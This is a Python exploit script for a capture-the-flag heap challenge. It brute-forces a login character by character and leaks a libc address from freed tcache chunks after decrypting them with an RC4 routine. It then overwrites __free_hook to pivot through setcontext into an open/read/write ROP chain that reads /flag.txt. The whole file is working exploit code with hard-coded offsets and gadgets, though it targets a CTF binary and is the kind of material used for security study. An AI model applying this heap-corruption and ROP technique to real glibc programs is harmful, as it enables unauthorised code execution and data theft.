#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
import string

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


res = ""

solved = 1

if not solved:

    def get_1_more_byte():
        global res
        for i in string.ascii_letters + string.digits:
            ru(b"Input your username:\n")
            sl((res + i).encode())
            get_line = rl()
            if not (b"Invalid username!\n" in get_line):
                res += i
                break
        lg_inf(res)
        return get_line

    def get_secret():
        global res
        while b"Invalid username length!\n" in get_1_more_byte():
            pass

    res = ""
    # get_secret()
    # username = res

    username = "4dm1n"
    res = "985da4f8cb37zk"

    def get_1_more_byte():
        global res
        for i in string.ascii_letters + string.digits:
            ru(b"Input your username:\n")
            sl(username)
            ru(b"Input your password:\n")
            sl((res + i).encode())
            get_line = rl()
            if not (b"Invalid password!\n" in get_line):
                res += i
                break
        lg_inf(res)
        return get_line

    def get_secret():
        global res
        while b"Invalid password length!\n" in get_1_more_byte():
            pass

    sl(b"xxx")

    get_secret()
    password = res

else:
    username = b"4dm1n"
    password = b"985da4f8cb37zkj"
    ru(b"Input your username:\n")
    sl(username)
    ru(b"Input your password:\n")
    sl(password)

lg_suc(username)
lg_suc(password)


def cmd(choice):
    ru(b"> \n")
    sl(i2b(choice))


def add(idx, size, data):
    cmd(1)
    ru(b"Input the key: \n")
    sl(i2b(idx))
    ru(b"Input the value size: \n")
    sl(i2b(size))
    ru(b"Input the value: \n")
    sl(data)


def show(idx):
    cmd(2)
    ru(b"Input the key: \n")
    sl(i2b(idx))
    ru(b"The result is:\n")
    ru(b"\t[key,value] = [")
    ru(b",")


def delet(idx):
    cmd(3)
    ru(b"Input the key: \n")
    sl(i2b(idx))


def edit(idx, data):
    cmd(4)
    ru(b"Input the key: \n")
    sl(i2b(idx))
    ru(b"Input the value: \n")
    sl(data)


def rc4(data: bytes) -> bytes:
    key = b"s4cur1ty_p4ssw0rd"
    """
    RC4 加密/解密函数。

    参数:
        key (bytes): 密钥（a2）。
        data (bytes): 要加密或解密的数据（a3）。

    返回:
        bytes: 加密或解密后的数据。
    """

    # 密钥调度算法（KSA）
    S = list(range(256))  # 初始化 S-box
    v8 = [0] * 256  # 对应 C 代码中的 v8 数组

    key_length = len(key)

    # 填充 v8 数组
    for i in range(256):
        v8[i] = key[i % key_length]

    v7 = 0
    for j in range(256):
        v7 = (v8[j] + v7 + S[j]) % 256
        S[j], S[v7] = S[v7], S[j]  # 交换 S[j] 和 S[v7]

    # 伪随机生成算法（PRGA）
    v5 = 0
    v6 = 0
    output = bytearray(data)  # 创建一个可变的字节数组用于存储结果

    for i in range(len(data)):
        v5 = (v5 + 1) % 256
        v6 = (v6 + S[v5]) % 256
        S[v5], S[v6] = S[v6], S[v5]  # 交换 S[v5] 和 S[v6]
        K = S[(S[v5] + S[v6]) % 256]
        output[i] ^= K  # XOR 作

    return bytes(output)


for i in range(9):
    add(i, 0x100, b"aaa")

for i in range(8):
    delet(i)

show(7)
data = rc4(ru(b"]\nEncrypt and save value...", drop=True))
libc_base = u64_ex(data[:8]) - 0x3EBCA0
lg("libc_base", libc_base)

"""
0x7ffff7452085 <setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
0x7ffff745208c <setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
0x7ffff7452093 <setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
0x7ffff7452097 <setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
0x7ffff745209b <setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
0x7ffff745209f <setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
0x7ffff74520a3 <setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
0x7ffff74520a7 <setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
0x7ffff74520ae <setcontext+94>:      push   rcx
0x7ffff74520af <setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
0x7ffff74520b3 <setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
0x7ffff74520ba <setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
0x7ffff74520c1 <setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
0x7ffff74520c5 <setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
0x7ffff74520c9 <setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
0x7ffff74520cd <setcontext+125>:     xor    eax,eax
0x7ffff74520cf <setcontext+127>:     ret
"""

pop_rdi_ret = libc_base + 0x000000000002164F
pop_rsi_ret = libc_base + 0x0000000000023A6A
pop_rdx_ret = libc_base + 0x0000000000001B96

edit(6, rc4(p64(libc_base + libc.sym.__free_hook)))
add(
    1,
    0x100,
    (
        flat(
            {
                0x68: [libc_base + libc.sym.__free_hook + 0x8],
                0x70: [0],
                0xA0: [libc_base + libc.sym.__free_hook + 0x20],
                0xA8: [
                    libc_base + libc.sym.open,
                ],
            }
        )
    ),
)
add(
    0,
    0x100,
    rc4(
        flat(
            {
                0x00: [libc_base + libc.sym.setcontext + 53],
                0x08: b"/flag.txt\x00",
                0x20: [
                    pop_rdi_ret,
                    3,
                    pop_rsi_ret,
                    libc_base + libc.sym.__free_hook + 0x8,
                    pop_rdx_ret,
                    0x100,
                    libc_base + libc.sym.read,
                    pop_rdi_ret,
                    1,
                    libc_base + libc.sym.write,
                ],
            }
        )
    ),
)

delet(1)

ia()
